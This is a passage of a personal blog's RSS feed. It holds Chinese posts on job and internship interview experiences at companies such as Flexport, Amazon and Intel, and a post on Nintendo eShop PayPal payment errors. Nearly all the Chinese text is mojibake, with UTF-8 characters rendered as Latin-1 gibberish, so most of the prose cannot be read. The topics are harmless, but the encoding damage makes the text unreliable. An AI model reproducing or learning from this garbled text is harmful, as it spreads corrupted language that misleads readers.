title="Flexport"></a>Flexport</h2><p>ä¸€äºŒè¿é¢ï¼Œé¢˜ç›®ä¸éš¾ï¼Œä¸‰é¢çš„é¢è¯•å®˜æ˜¯å‰åŒäº‹ğŸ¤£ã€‚RSU çš„é¥¼å¾ˆå¤§ï¼Œä½†è¿˜æ˜¯é€‰ç°é‡‘å¤šçš„xd</p><p><strong>ä¸€é¢</strong></p><ol><li>è‡ªæˆ‘ä»‹ç»</li><li>è®¾è®¡é¢˜<ul><li>clientã€orderã€match</li><li>æ—¶é—´å¤æ‚åº¦</li><li>ä¼˜åŒ–ï¼šå †ï¼ˆå®Œå…¨äºŒå‰æ ‘ã€æ—¶é—´å¤æ‚åº¦ï¼‰</li></ul></li><li>åé—®ï¼šç»„ç»‡æ¶æ„<ul><li>ç ”å‘ï¼šæ“ä½œç³»ç»Ÿã€ç‰©æµåŠŸèƒ½</li><li>OPS&#x2F;Operations</li></ul></li></ol><p><strong>äºŒé¢</strong></p><ol><li>ç®—æ³•é¢˜<ul><li>L å‹èµ°æ³•ï¼Œ<code>w*h</code> å¤§å°æ£‹ç›˜æ˜¯å¦èƒ½è¦†ç›–</li><li>åªèµ°ä¸€ä¸ªæ–¹å‘æ˜¯å¦èƒ½è¦†ç›–</li></ul></li><li>åé—®<ul><li>æŒ‰ä¸šåŠ¡ï¼ˆBUï¼‰ç»„ç»‡ï¼Œ10+ äºº</li><li>å·¥ä½œé€‰æ‹©ï¼šå¤–ä¼ã€å‰æ™¯ã€åœ°ç‚¹</li><li>è·¨æ—¶åŒºäº¤æµï¼šä¸ä¼šå¾ˆå¤š</li><li>æŠ€æœ¯æ ˆï¼šRubyã€JVMã€React</li><li>åŸ¹è®­æœºåˆ¶ï¼šmangerã€mentorã€è¯¾ç¨‹</li></ul></li></ol><p><strong>ä¸‰é¢</strong></p><ol><li>è‡ªæˆ‘ä»‹ç»</li><li>é¢è¯•å®˜è‡ªæˆ‘ä»‹ç»</li><li>ä»ä»¥ä¸‹å››ä¸ªæ–¹é¢ä»‹ç»é¡¹ç›®<ul><li>èƒŒæ™¯&amp;ç›®çš„ background</li><li>æŒ‘æˆ˜ challenge</li><li>æ–¹æ¡ˆ action</li><li>ç»“æœ result</li></ul></li><li>å…¨æ ˆé¡¹ç›®ä»‹ç»<ul><li>å„ä¸ªæ¨¡å—çš„é€‰å‹ç†ç”±ï¼šæ•°æ®åº“ã€QuickSightã€Lambdaã€Harmonyã€æƒé™ç®¡ç†ï¼ˆIAMã€CDKï¼‰</li><li>manager æ˜¯è°ï¼Œä¸ºä»€ä¹ˆæ²¡æœ‰ return offerï¼ˆå“ªäº› LP åšå¾—ä¸å¥½ï¼‰</li></ul></li><li>ä¸ºä»€ä¹ˆä¸å­˜å‚¨åœ¨å†…å­˜ä¸­ï¼Œä¸ºä»€ä¹ˆè¦æœ‰æ•°æ®åº“ï¼šå†…å­˜æ”¾ä¸ä¸‹</li><li>MySQL å’Œ Redis åŒºåˆ«ï¼šSQL ä¸ NoSQLã€æŒä¹…åŒ–ã€äº‹åŠ¡<ul><li>CAP å®šç†</li><li>å…³ç³»å‹æ•°æ®åº“èƒ½å®ç°åˆ†å¸ƒå¼äº‹åŠ¡å—</li></ul></li><li>ä¸ºä»€ä¹ˆè¦æœ‰ä¼ è¾“å±‚ï¼šå¯é æ€§<ul><li>æµé‡æ§åˆ¶ã€æ‹¥å¡æ§åˆ¶</li></ul></li><li>åé—®ï¼šä¸šåŠ¡<ul><li>Trade Platform</li><li>Operation Tech: on-time performance, cost-saving</li><li>ç±»ä¼¼ TMSï¼ˆplanningã€executionï¼‰ï¼Œforward application</li><li>OC: document, concern, assignmentï¼ˆå‡ºå£ã€è¿›å£ï¼‰</li><li>ç›®æ ‡æ˜¯åšæˆ SaaS</li></ul></li></ol><h2 id="è‹±é›„æ¸¸æˆ"><a href="#è‹±é›„æ¸¸æˆ" class="headerlink" title="è‹±é›„æ¸¸æˆ"></a>è‹±é›„æ¸¸æˆ</h2><p>é¢è¯•å®˜ä¸å¼€æ‘„åƒå¤´ï¼Œä½†è¦æ±‚æˆ‘å¼€æ‘„åƒå¤´ï¼Œé¢è¯•ä½“éªŒè¾ƒå·®ï¼ŒäºŒé¢å·²æ‹’ã€‚</p><p><strong>ä¸€é¢</strong></p><ol><li>è‡ªæˆ‘ä»‹ç»</li><li>å…¨æ ˆé¡¹ç›®ä»‹ç»</li><li>Java ç¨‹åºåˆ†æç³»ç»Ÿä»‹ç»</li><li>çº¿ç¨‹æ± </li><li>çº¿ç¨‹å®‰å…¨ï¼ˆvolatileã€synchronizedã€Lockï¼‰<ul><li>åº•å±‚</li><li>ä¸‰è¦ç´ ï¼šåŸå­æ€§ã€å¯è§æ€§ã€æœ‰åºæ€§</li></ul></li><li>å…¬å¹³é”ä¸éå…¬å¹³é”å®ç°ï¼šAQSã€CAS</li><li>IO æ¨¡å‹<ul><li>NIO</li><li>å¤šè·¯å¤ç”¨ epoll</li><li>åç¨‹</li></ul></li><li>Redis æŒä¹…åŒ–<ul><li>RDBã€AOF</li><li>é˜»å¡</li><li>å†™æ—¶å¤åˆ¶</li></ul></li><li>MySQL ç´¢å¼•<ul><li>ä¼˜ç‚¹</li><li>åº•å±‚æ•°æ®ç»“æ„</li><li>è”åˆç´¢å¼•ï¼Œå¦‚ä½•å­˜å‚¨ï¼Œæ˜¯å¦å¤±æ•ˆ</li></ul></li><li>KCPï¼ˆä¸äº†è§£ï¼‰</li><li>å¿«æ’ã€å½’å¹¶ï¼Œæ—¶é—´å¤æ‚åº¦</li><li>ä¸‰æ•°å€¼å’Œï¼ˆæ¥è¿‘ targetï¼‰</li><li>åé—®<ul><li>2 è½®æŠ€æœ¯ + 1 è½® HR é¢</li><li>æ–°é¡¹ç›®ï¼ˆUEï¼‰ã€è€é¡¹ç›®ï¼ˆUnityï¼‰</li><li>æœåŠ¡å™¨ï¼ˆJavaï¼‰ã€å®¢æˆ·ç«¯ã€ç¾æœ¯ã€ç­–åˆ’</li></ul></li></ol><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>æ‹›è˜ä¿¡æ¯ä¸»è¦ä»æ ¡å›­è®ºå›ã€ç‰›å®¢ç½‘ã€Linkedin è·å–ï¼ŒæŠ•é€’çš„å…¨æ˜¯å¼€å‘å²—ä½ï¼Œéƒ¨åˆ†æœ‰å†…æ¨ã€‚9 æœˆä¸­æ—¬å®ä¹ ç»“æŸåæ‰å¼€å§‹å‡†å¤‡å’ŒæŠ•é€’ï¼Œæ²¡æœ‰åšå¥½å‡†å¤‡å°±é™†ç»­å¼€å§‹é¢è¯•äº†ï¼Œ10 æœˆåº•é›†ä¸­ä¸¤ä¸‰å¤©åšé“¶è¡Œç¬”è¯•ï¼Œä¹‹åæŒç»­ç¬”è¯•é¢è¯•ï¼ŒæœŸé—´è¿˜èŠ±äº†ä¸¤å¤©å‡†å¤‡å’Œå‚åŠ ä¸­æœŸç­”è¾©ï¼Œæœ€åç»ˆäºç­‰åˆ°äº†ã€ŒUnity ä¸­å›½ã€ï¼Œå¯„å‡ºä¸‰æ–¹åæ‹’ç»äº†å…¶ä»–åœ¨æµç¨‹ä¸­çš„ã€‚</p><p>ç§‹æ‹›æˆ˜çº¿ä¸¤ä¸ªå¤šæœˆï¼Œé›¶é›¶æ•£æ•£ä¹Ÿæ‹¿åˆ°åå‡ ä¸ª offerï¼Œç»ˆäºå®šä¸‹æ¥äº†ã€‚</p>]]></content:encoded>
      
      
      <category domain="https://jckling.github.io/categories/Notes/">Notes</category>
      
      
      
      <comments>https://jckling.github.io/2022/11/30/Notes/23%20%E5%B1%8A%E7%A7%8B%E6%8B%9B%E9%9D%A2%E8%AF%95%E6%80%BB%E7%BB%93/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>æ—¥åŒº eshop æ— æ³•ä½¿ç”¨ PayPal</title>
      <link>https://jckling.github.io/2022/08/14/Game/NS/%E6%97%A5%E5%8C%BA%20eshop%20%E6%97%A0%E6%B3%95%E4%BD%BF%E7%94%A8%20PayPal/</link>
      <guid>https://jckling.github.io/2022/08/14/Game/NS/%E6%97%A5%E5%8C%BA%20eshop%20%E6%97%A0%E6%B3%95%E4%BD%BF%E7%94%A8%20PayPal/</guid>
      <pubDate>Sun, 14 Aug 2022 10:12:52 GMT</pubDate>
      
      <description>é”™è¯¯ä»£ç  9001-9310ã€9001-1787ã€2813-9310</description>
      
      
      
      <content:encoded><![CDATA[<h1 id="é—®é¢˜è§£å†³"><a href="#é—®é¢˜è§£å†³" class="headerlink" title="é—®é¢˜è§£å†³"></a>é—®é¢˜è§£å†³</h1><ol><li>ä¸è¦é‡å¤è§£ç»‘å’Œç»‘å®š PayPal è´¦å·</li><li>é‡åˆ° 9001-9310 é”™è¯¯ä»£ç ï¼Œåªè¦ä¸æ–­é‡å¤å°è¯•å°±å¯ä»¥æˆåŠŸè´­ä¹°</li></ol><h1 id="è§£å†³æµç¨‹"><a href="#è§£å†³æµç¨‹" class="headerlink" title="è§£å†³æµç¨‹"></a>è§£å†³æµç¨‹</h1><p>ä¸€ç›´æƒ³å‡‘ä¸€è½¦äººå¼€ NS å®¶åº­ä¼šå‘˜ï¼Œç»ˆäºæ‹‰å¤Ÿäº†ä¸‰äº”å¥½å‹ï¼Œç„¶åå‘ç°æ¸¯æœåªèƒ½ç”¨ä¿¡ç”¨å¡</p><img src="https://s2.loli.net/2022/08/14/KWHSVOnmXod9NzG.png" width="90%"><p>è€Œæ—¥æœå¯ä»¥ä½¿ç”¨ PayPal æˆ–ä¿¡ç”¨å¡</p><img src="https://s2.loli.net/2022/08/14/zNhQ8sWDcy7Ufed.jpg" width="60%"><p>ä½†æ˜¯æ—¥æœè´¦å·ç»‘å®š PayPal åæ— æ³•è´­ä¹°ï¼Œé‡åˆ° 9001-9310 é”™è¯¯ä»£ç ï¼Œç½‘ä¸Šæœäº†ä¸€åœˆè§£å†³æ–¹æ³•ï¼š</p><ol><li>é‡å¤è§£ç»‘å’Œç»‘å®šï¼šé‡åˆ° 9001-1787 é”™è¯¯ä»£ç ï¼ŒPayPal è´¦æˆ·è¢«å†»ç»“ï¼Œå¾—ç­‰å¾…ä¸€ä¸¤å¤©åæ‰èƒ½é‡æ–°ç»‘å®šã€‚</li><li>æ›´æ¢é‚®ç®±ï¼šå°† PayPal é‚®ç®±æ¢æˆäº† gmail çš„ï¼Œä»ç„¶æ— æ³•è´­ä¹°ã€‚</li><li>ä½¿ç”¨ä¸»æœºè¿›å…¥ eshop è´­ä¹°ï¼šé‡åˆ° 2813-9310 é”™è¯¯ä»£ç ï¼ŒåŒç½‘é¡µç‰ˆçš„ 9001-1787 é”™è¯¯ä»£ç ã€‚</li></ol><img src="https://s2.loli.net/2022/08/14/cFealAQUSg7ZRqm.jpg" width="90%"><img src="https://s2.loli.net/2022/08/14/mGov8Qtu6SkpdsB.jpg" width="90%"><p>æœ€åï¼Œæˆ‘è¾¹çœ‹ Lycoris Recoil æ›´æ–°è¾¹é‡å¤ç‚¹å‡»è´­ä¹°ï¼Œä¸æ–­é‡åˆ° 9001-9310 é”™è¯¯ä»£ç ï¼Œå°è¯• <strong>åå‡ æ¬¡</strong> å°±æˆåŠŸä¹°ä¸Šäº†â€¦â€¦</p><p>åªèƒ½è¯´ä»»å¤©å ‚çš„æ”¯ä»˜æ¥å£çœŸçš„å¾ˆç„å­¦ï¼Œä¸å°‘ç½‘å‹ä¹Ÿéƒ½é‡åˆ°æ— æ³•è´­ä¹°çš„é—®é¢˜ï¼Œè§£å†³åŠæ³•å°±æ˜¯é‡å¤å°è¯•è´­ä¹°ï¼Œæ€»æœ‰ä¸€ä¸‹å¯ä»¥æˆåŠŸè´­ä¹°ğŸ˜…</p><h1 id="å‚é˜…"><a href="#å‚é˜…" class="headerlink" title="å‚é˜…"></a>å‚é˜…</h1><ul><li><a href="https://pttgamer.com/NSwitch/1XzXQXCT">[å•é¡Œ] è·³å€å¾Œç¶å®šPaypalå‡ºç¾ 9001-1787 ç„¡æ³•ç¶</a></li><li><a href="https://www.paypal-community.com/t5/Payments-Archives/Error-9001-9310-when-buying-Nintendo-Online/td-p/1677465">Error 9001-9310 when buying Nintendo Online</a></li><li><a href="https://en-americas-support.nintendo.com/app/answers/detail/a_id/29173/kw/9001-9310/session/L3RpbWUvMTU4NTA1NzczNi9nZW4vMTU4NTA1NzczNi9zaWQvZlVtU0Z0OHZGN0FDUGFlUUFOSnQxYXF5RHBHeEtNcUdjWkJjVk5NVm1iaEVpdHJNYUxZSU1RWWp5SWJMOWZVc0JnOEFYa3JJQVFQOGNJJTdFV0V3TVRsYzkwcHo3MmtxWW5DM3RTdDRLU0hsU3doaDh5U1VNcDlNM1ElMjElMjE=">Error Code: 9001-9310</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://jckling.github.io/categories/Game/">Game</category>
      
      
      <category domain="https://jckling.github.io/tags/Nintendo/">Nintendo</category>
      
      
      <comments>https://jckling.github.io/2022/08/14/Game/NS/%E6%97%A5%E5%8C%BA%20eshop%20%E6%97%A0%E6%B3%95%E4%BD%BF%E7%94%A8%20PayPal/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>23 å±Šæš‘æœŸå®ä¹ é¢è¯•æ€»ç»“</title>
      <link>https://jckling.github.io/2022/05/20/Notes/23%20%E5%B1%8A%E6%9A%91%E6%9C%9F%E5%AE%9E%E4%B9%A0%E9%9D%A2%E8%AF%95%E6%80%BB%E7%BB%93/</link>
      <guid>https://jckling.github.io/2022/05/20/Notes/23%20%E5%B1%8A%E6%9A%91%E6%9C%9F%E5%AE%9E%E4%B9%A0%E9%9D%A2%E8%AF%95%E6%80%BB%E7%BB%93/</guid>
      <pubDate>Fri, 20 May 2022 02:25:50 GMT</pubDate>
      
      <description>äº¬ä¸œç§‘æŠ€ã€å›¾æ£®æœªæ¥ã€ç¾å›¢ã€ç™¾åº¦ã€è”æƒ³ã€å­—èŠ‚è·³åŠ¨ã€è…¾è®¯ã€ç‰¹æ–¯æ‹‰ã€è‹±ç‰¹å°”ã€FreeWheelã€äºšé©¬é€Š</description>
      
      
      
      <content:encoded><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>è‡ª 3.31 æŠ•é€’ç®€å†ä»¥æ¥ï¼Œæœ‰è‡³ä»Šæ²¡æœ‰æ¶ˆæ¯çš„ï¼Œæœ‰å·²ç»æŒ‚äº†ï¼Œä¹Ÿæœ‰æ‹¿åˆ° offer çš„ã€‚çœŸçš„è¦æ—©ç‚¹å‡†å¤‡æ—©ç‚¹æŠ•é€’ï¼Œæœ‰å†…æ¨å°±å†…æ¨ï¼Œå°±æˆ‘å¤´é“ç›´æ¥åˆ°å¤„æŠ•â€¦â€¦ å¦å¤–ï¼Œè¯´è¯åœ†æ»‘è‚¯å®šæ›´è®¨å–œï¼Œæˆ‘çš„ä¸€äº›åé—®å¯èƒ½å¤ªç›´æ¥äº†:(</p><p>ç»è¿‡ä¸€ä¸ªå¤šæœˆçš„æˆ˜æ–—ï¼ˆç¬”è¯•é¢è¯•ï¼‰ï¼Œæœ€ç»ˆæˆ‘å†³å®šå»äºšé©¬é€Šå®ä¹ ï¼Œå¾ˆå¹¸è¿èƒ½å¤Ÿä»æµ‹è¯•è½¬åˆ°å¼€å‘ï¼Œéå¸¸æ„Ÿè°¢å¤§å®¶çš„å·¥ä½œä¸æ”¯æŒã€‚</p><p>æ¥ä¸‹æ¥æŒ‰<strong>ä¸€é¢</strong>æ—¶é—´é¡ºåºç½—åˆ—é¢è¯•è®°å½•ã€‚</p><h1 id="é¢è¯•è®°å½•"><a href="#é¢è¯•è®°å½•" class="headerlink" title="é¢è¯•è®°å½•"></a>é¢è¯•è®°å½•</h1><h2 id="äº¬ä¸œç§‘æŠ€"><a href="#äº¬ä¸œç§‘æŠ€" class="headerlink" title="äº¬ä¸œç§‘æŠ€"></a>äº¬ä¸œç§‘æŠ€</h2><p>æŠ•é€’æ—¶è²Œä¼¼è¿˜æ²¡æœ‰æš‘æœŸå®ä¹ çš„å²—ä½ï¼Œåº”è¯¥æ˜¯æ—¥å¸¸å®ä¹ çš„å²—ä½ã€‚ä½“éªŒä¸å¥½çš„ä¸€ç‚¹æ˜¯é¢è¯•ä¹‹åæŸ¥è¯¢ä¸åˆ°æŠ•é€’ä¿¡æ¯ï¼Œé‚®ä»¶è¯¢é—®çš„åé¦ˆæ˜¯å²—ä½å¯èƒ½ä¸åŒ¹é…ï¼ˆé‚£ä¹Ÿä¸ç”¨æ¸…é™¤è®°å½•å§â€¦â€¦ï¼‰ã€‚</p><p><strong>ä¸€é¢</strong></p><ol><li>è‡ªæˆ‘ä»‹ç»</li><li>ä»‹ç»åœ¨é¡¹ç›®é‡Œéƒ½åšå“ªäº›å…·ä½“çš„å†…å®¹<ul><li>ç”¨ Go åšåŒºå—é“¾é¡¹ç›®ï¼Œç”¨äº†å“ªäº›åŒ…ï¼Œå¦‚ä½•æ‰©å±•å…¶ä»–çš„åŒ…</li><li>ç”¨ Python å†™çš„é“¾è·¯è¿½è¸ªå·¥å…·ï¼Œæ˜¯å¦æœ‰çœ‹è¿‡å®Œæ•´çš„é¡¹ç›®ï¼Œä»‹ç»ä¸€ä¸‹</li><li>ç”¨ Java å†™çš„é™æ€åˆ†æå·¥å…·ï¼Œä»‹ç»ä¸€ä¸‹ï¼ˆé¢è¯•å®˜ç†Ÿæ‚‰ Pythonï¼‰</li></ul></li><li>OpenStack ç»„ä»¶éƒ½æœ‰å“ªäº›ï¼Œéƒ½æ˜¯å¹²å˜›çš„ï¼Œä»¥åŠç»„ä»¶å†…éƒ¨æ˜¯å¦‚ä½•å®ç°çš„</li><li>ç”¨è¿‡ Kolla-Ansibleï¼Œé‚£å®ƒæ˜¯å¦‚ä½•å®ç°çš„</li><li>Docker å¸¸ç”¨å‘½ä»¤ï¼Œä¾‹å¦‚ï¼Œå¦‚ä½•æ‰“åŒ…é•œåƒ</li><li>Linux å¸¸ç”¨æŒ‡ä»¤<ul><li>å¦‚ä½•æŸ¥çœ‹å ç”¨ 80 ç«¯å£çš„è¿›ç¨‹</li><li>å¦‚ä½•æ€æ­» nginx è¿›ç¨‹</li><li>æŸ¥æ‰¾åŒ…å«ç‰¹å®šå­—ç¬¦ä¸²çš„æ–‡ä»¶</li><li>å­—ç¬¦ä¸²æ›¿æ¢</li><li>å¦‚ä½•ä½¿ç”¨ä¸€è¡Œå‘½ä»¤å®ç°ä¸Šè¿°åŠŸèƒ½</li></ul></li><li>Python ç›¸å…³çš„å†…å®¹<ul><li>åŸºæœ¬æ•°æ®ç±»å‹ã€æ’åºæ“ä½œç­‰</li><li>å¦‚ä½•æ‰“åŒ…å’Œå‘å¸ƒ</li><li>æœ‰ç”¨ Python åšä»€ä¹ˆä¸œè¥¿</li><li>è£…é¥°å™¨å¦‚ä½•å®ç°</li></ul></li><li>äº†è§£ Nginx å¼•æ“å—ï¼Œåå‘ä»£ç†å¦‚ä½•å®ç°</li><li>ä»‹ç»ä¸€ä¸‹äº†è§£çš„ Git æŒ‡ä»¤</li><li>å¼€æºç¤¾åŒºè´¡çŒ®</li><li>å¦‚ä½•æ­å»ºåšå®¢ï¼ˆå®é™…ä¸Šæ˜¯æƒ³é—®æ€ä¹ˆéƒ¨ç½²åˆ°æœåŠ¡å™¨ä¸Šï¼‰</li></ol><h2 id="å›¾æ£®æœªæ¥"><a href="#å›¾æ£®æœªæ¥" class="headerlink" title="å›¾æ£®æœªæ¥"></a>å›¾æ£®æœªæ¥</h2><p>å°è±¡æ·±åˆ»ï¼Œä½¿ç”¨å†…æ¨ç æŠ•é€’ï¼Œä¸€é¢å°±æ˜¯è€ƒå¯Ÿåšé¢˜ï¼Œå½“æ—¶è¿˜æ²¡æ€ä¹ˆåš leetcode ä¸Šçš„é¢˜ï¼Œç»“æœéå¸¸è‰°éš¾åœ°åšå®Œç¬¬ä¸€é¢˜ï¼Œç¬¬äºŒé¢˜æ¯«æ— å¤´ç»ªï¼Œåç»­å½“ç„¶æ˜¯æ²¡æœ‰åç»­äº†ã€‚</p><p><strong>ä¸€é¢</strong></p><ol><li>è‡ªæˆ‘ä»‹ç»</li><li>é¡¹ç›®ç›¸å…³å†…å®¹<ul><li>æ˜¯å¦å‚è€ƒå¼€æºä»£ç </li><li>é‡åˆ°çš„éš¾ç‚¹ï¼Œå¦‚ä½•è§£å†³</li></ul></li><li>ç®—æ³•<ul><li>è´ªå¿ƒ + å°æ ¹å †</li><li>åŠ¨æ€è§„åˆ’</li></ul></li></ol><h2 id="äºšé©¬é€Š"><a href="#äºšé©¬é€Š" class="headerlink" title="äºšé©¬é€Š"></a>äºšé©¬é€Š</h2><p>æŠ•é€’äº†æµ‹è¯•ï¼ˆSDETï¼‰å’Œå¼€å‘ï¼ˆSDEï¼‰çš„å²—ä½ï¼Œæ”¶åˆ°äº†æµ‹è¯•çš„ç¬”è¯•ï¼Œå¾ˆç®€å•çš„ä¸¤é“é¢˜ï¼Œæ¬¡å‘¨å°±çº¦é¢è¯•äº†ã€‚ä¸¤è½®é¢è¯•åï¼Œé€šçŸ¥æˆ‘éœ€è¦ç­‰å¾…å›¢é˜ŸåŒ¹é…ï¼Œåæ¥å¾—çŸ¥æ˜¯åŸæ¥çš„å›¢é˜Ÿä¸ç¼ºæµ‹è¯•äº†ï¼Œä½†æœ‰å›¢é˜Ÿéœ€è¦å¼€å‘ï¼Œå…´å†²å†²åœ°æ¥å—äº†ï¼Œä½†éœ€è¦åŠ é¢ä¸€è½®ã€‚ä¸è¿‡æœ€åè¿˜æ˜¯å¦‚æ„¿ä»¥å¿æ‹¿åˆ° offer äº†~</p><p><strong>ä¸€é¢</strong></p><ol><li>è‡ªæˆ‘ä»‹ç»</li><li>é¡¹ç›®ç›¸å…³<ul><li>è¯¦ç»†ä»‹ç»ä¸€ä¸ªé¡¹ç›®</li><li>å¼€å‘çš„ä¸»è¦éš¾ç‚¹</li><li>åº”ç”¨æƒ…å†µ</li><li>è¿½è¸ªäº‘å¹³å°ä¸è¿½è¸ªäº‘å¹³å°ä¸Šçš„è½¯ä»¶çš„å·®åˆ«ï¼ˆå¼€å‘éš¾ç‚¹ï¼‰</li></ul></li><li>é‡åˆ°çš„å›°éš¾ä¸è§£å†³</li><li>ç®—æ³•<ul><li>åˆ é™¤å­—ç¬¦ä¸²ä¸­çš„æ‰€æœ‰å›æ–‡å­ä¸²</li></ul></li></ol><p><strong>äºŒé¢ï¼ˆç®—æ³•ï¼‰</strong></p><ol><li>åˆ é™¤å€’æ•°ç¬¬ N ä¸ªèŠ‚ç‚¹<ul><li>ç»™å‡ºä¸€äº› testcase</li></ul></li><li>è®¾è®¡ Employee ç±»<ul><li>idã€nameã€titleã€reporter</li><li>è¿”å›æ‰‹ä¸‹å‘˜å·¥æ•°é‡</li><li>æ‰¾åˆ°æŠ¥å‘Šé“¾</li></ul></li></ol><p><strong>ä¸‰é¢</strong></p><ol><li>è‡ªæˆ‘ä»‹ç»</li><li>é¡¹ç›®<ul><li>åŒºå—é“¾é¡¹ç›®ä»‹ç»</li><li>Java ç¨‹åºåˆ†æé¡¹ç›®ä»‹ç»</li></ul></li><li>ç®—æ³•<ul><li>Kä¸ªä¸€ç»„ç¿»è½¬é“¾è¡¨</li><li>äºŒå‰æ ‘å³è§†å›¾ï¼ˆBFSã€DFSï¼‰</li></ul></li><li>é¡¹ç›®ä¸­é‡åˆ°çš„å›°éš¾ä¸è§£å†³</li></ol><h2 id="è‹±ç‰¹å°”"><a href="#è‹±ç‰¹å°”" class="headerlink" title="è‹±ç‰¹å°”"></a>è‹±ç‰¹å°”</h2><p>æ¥åˆ°ç”µè¯åç›´æ¥å¼€å§‹ç”µè¯é¢ï¼Œåæ¥çº¿ä¸‹é¢å‘ç°æ˜¯äºŒé¢çš„é¢è¯•å®˜æ‰“çš„ç”µè¯ã€‚çº¿ä¸‹é¢æ¥åˆ°ç¯çƒè´¸æ˜“ä¸­å¿ƒçš„åŠå…¬å®¤ï¼Œé¢è¯•åœ°ç‚¹åº”è¯¥æ˜¯ä¸€ä¸ªå°è®¨è®ºé—´ï¼Œä¸€è·¯èµ°æ¥æ„Ÿè§‰ç•¥æ²‰é—·â€¦â€¦ï¼Ÿå¯èƒ½è¿™å°±æ˜¯è€ç‰Œå…¬å¸çš„æ²‰ç¨³ã€‚ä¸¤è½®æŠ€æœ¯é¢ï¼Œå› ä¸º boss æ²¡ç©ºæ‰€ä»¥æ²¡æœ‰ç¬¬ä¸‰è½®ï¼Œä¸è¿‡åæ¥æˆ‘ä¹Ÿæ²¡æ¥åˆ°é€šçŸ¥ã€‚</p><p><strong>ç”µè¯é¢</strong></p><ol><li>é¡¹ç›®<ul><li>å¯¹äº‘è®¡ç®—çš„ç†è§£</li><li>ä¸ºä»€ä¹ˆç”¨ Jaeger</li></ul></li><li>ç®—æ³•<ul><li>æœ€å°æ·±åº¦</li><li>æœ€å·¦ä¾§çš„æœ€å°æ·±åº¦</li></ul></li><li>å…«è‚¡<ul><li>è¿›ç¨‹ä¸çº¿ç¨‹</li><li>ç¨‹åºå†…å­˜å¦‚ä½•åˆ†é…ï¼ˆè¿›ç¨‹å †æ ˆéƒ½åˆ†é…ä»€ä¹ˆï¼‰</li><li>TCP&#x2F;IP ä¸‰æ¬¡æ¡æ‰‹</li><li>Golang ä¸­çš„åç¨‹</li><li>Linux ä¸­å¸¸ç”¨çš„æŒ‡ä»¤</li><li>Linux ç³»ç»Ÿä¸­æŸ¥çœ‹ç£ç›˜å ç”¨æƒ…å†µ</li></ul></li></ol><p><strong>ä¸€é¢</strong></p><ol><li>ç®—æ³•ï¼ˆ30minï¼‰ï¼š2åŸºç¡€ + 2æå‡<ul><li>æ‰¾å‡ºç¬¬ k å¤§çš„æ•°å­—</li><li>åˆ é™¤å­—ç¬¦ä¸²ä¸­ç›¸é‚»çš„ç›¸åŒå­—ç¬¦ï¼Œé‡å¤æ“ä½œï¼Œè¿”å›ç»“æœå­—ç¬¦ä¸²</li><li>äºŒå‰æ ‘ï¼Œåˆ°å¶èŠ‚ç‚¹è·¯å¾„å’Œä¸º k çš„è·¯å¾„</li><li>ä¸å«é‡å¤å…ƒç´ çš„æ•°ç»„ï¼Œæ‰¾å‡ºå’Œä¸º k çš„å…ƒç´ å¯¹ï¼ˆé›†åˆï¼‰</li></ul></li><li>é¡¹ç›®ç›¸å…³<ul><li>åˆ›å»º VM çš„ç»„ä»¶äº¤äº’</li><li>è¿˜è®°å¾—å“ªäº›äº¤äº’</li><li>å¦‚ä½•æ”¶é›†ä¿¡æ¯</li><li>ä¿¡æ¯å¦‚ä½•ä¼ é€’ï¼ˆè°ƒç”¨ä»€ä¹ˆæ¥å£ã€æ€ä¹ˆè°ƒç”¨ï¼‰</li><li>è´Ÿè´£å¼€å‘å“ªéƒ¨åˆ†ï¼Œä¸¾ä¾‹è¯´æ˜</li></ul></li><li>Linux å¸¸ç”¨æ“ä½œæœ‰å“ªäº›</li><li>æ“ä½œç³»ç»Ÿç®¡ç†çš„èµ„æº</li><li>ç¡¬ä»¶ç›¸å…³ï¼šä¸»æ¿ã€æ’æ§½ã€USBã€æ€»çº¿</li><li>å¦‚ä½•å®ç°èµ„æºå…±äº«ï¼ˆäº’æ–¥ã€é”çš„ç§ç±»ï¼‰</li><li>è¿›ç¨‹é—´é€šä¿¡éƒ½æœ‰å“ªäº›æ–¹å¼</li><li>å­¦è¿‡å“ªäº›è¯¾ç¨‹<ul><li>å¯¹ç§°åŠ å¯†ã€éå¯¹ç§°åŠ å¯†</li><li>ä¸ºä»€ä¹ˆä¸€æŠŠåŠ å¯†ä¸€æŠŠè§£å¯†ï¼ˆåŸç†ï¼‰</li><li>PKI</li></ul></li><li>è¯»è¿‡ Unix ç¼–ç¨‹å—ï¼ˆå¥½ä¹¦ï¼‰</li></ol><p><strong>äºŒé¢</strong></p><ol><li>ä¸Šä¸€ä½æ˜¯å¦è€ƒå¯Ÿè‹±æ–‡</li><li>è‹±æ–‡å¦‚ä½•</li><li>è‹±æ–‡è°ˆè°ˆå¯¹ Infrastructure çš„ç†è§£<ul><li>é‡ç‚¹æ˜¯èµ„æºè™šæ‹ŸåŒ–ã€åˆ†å¸ƒå¼å…¶æ¬¡</li></ul></li><li>ä¸Šä¸€ä½è€ƒå¯Ÿäº†å“ªäº›å†…å®¹</li><li>ç”¨è¿‡å“ªäº› Docker æŒ‡ä»¤ï¼Œä¸»è¦ç”¨ docker åšä»€ä¹ˆ</li><li>ä»‹ç»ä¸€ä¸‹ç›®å‰åœ¨åšçš„ Java é¡¹ç›®</li><li>ä¸€äº› Java ç›¸å…³é—®é¢˜ï¼ˆå®Œå…¨ä¸ä¼šï¼‰</li><li>å­¦è¿‡å“ªäº›è¯¾ç¨‹ï¼Œå–œæ¬¢ä»€ä¹ˆ</li><li>æœ‰è€ƒè™‘å†…æ ¸æ–¹å‘å—ï¼Œåˆšå–œæ¬¢åä¸‹å±‚è¿˜æ˜¯åä¸Šå±‚çš„ï¼ˆç»“æœè®¤ä¸ºæˆ‘å–œæ¬¢åº”ç”¨å¼€å‘â€¦â€¦ï¼‰</li><li>ä¸ºä»€ä¹ˆè§‰å¾—åŒ—é‚®çš„è¯¾ç¨‹æ°´</li><li>ä¿ç ”è¿˜æ˜¯è€ƒç ”</li><li>è°ˆè°ˆè‡ªå·±çš„ä¼˜åŠ¿</li><li>å·¥ä½œè§„åˆ’</li><li>äº†è§£ k8s 